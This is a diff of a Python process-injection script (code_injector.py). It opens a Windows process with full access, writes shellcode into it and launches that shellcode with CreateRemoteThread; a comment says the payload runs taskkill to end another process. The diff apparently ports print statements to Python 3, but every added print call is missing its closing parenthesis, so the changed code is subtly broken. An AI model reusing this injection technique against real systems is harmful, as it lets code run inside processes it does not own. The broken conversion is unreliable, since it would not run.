@@ -10,7 +10,7 @@ pid           = int(sys.argv[1])
 pid_to_kill   = sys.argv[2]
 
 if not sys.argv[1] or not sys.argv[2]:
-    print "Code Injector: ./code_injector.py <PID to inject> <PID to Kill>"
+    print("Code Injector: ./code_injector.py <PID to inject> <PID to Kill>"
     sys.exit(0)
 
 #/* win32_exec -  EXITFUNC=thread CMD=cmd.exe /c taskkill /PID AAAA 
@@ -39,7 +39,7 @@ h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
 
 if not h_process:
 
-    print "[*] Couldn't acquire a handle to PID: %s" % pid
+    print("[*] Couldn't acquire a handle to PID: %s" % pid
     sys.exit(0)
 
 # Allocate some space for the shellcode
@@ -54,8 +54,8 @@ kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(
 thread_id = c_ulong(0)
 if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):
 
-    print "[*] Failed to inject process-killing shellcode. Exiting."
+    print("[*] Failed to inject process-killing shellcode. Exiting."
     sys.exit(0)
 
-print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
-print "[*] Process %s should not be running anymore!" % pid_to_kill
+print("[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
+print("[*] Process %s should not be running anymore!" % pid_to_kill
